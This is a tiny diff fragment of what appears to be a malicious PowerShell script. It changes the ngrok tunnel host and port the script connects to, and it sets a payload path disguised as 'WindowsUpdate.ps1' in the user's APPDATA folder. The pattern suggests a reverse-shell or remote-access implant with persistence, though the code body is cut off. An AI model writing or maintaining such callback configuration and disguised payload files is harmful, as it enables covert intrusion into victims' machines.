@@ -1,5 +1,5 @@
-$ip = '5.tcp.eu.ngrok.io'
-$port = 14706
+$ip = '6.tcp.eu.ngrok.io'
+$port = 11211
 $path = "$env:APPDATA\WindowsUpdate.ps1"
 
 $code = @"
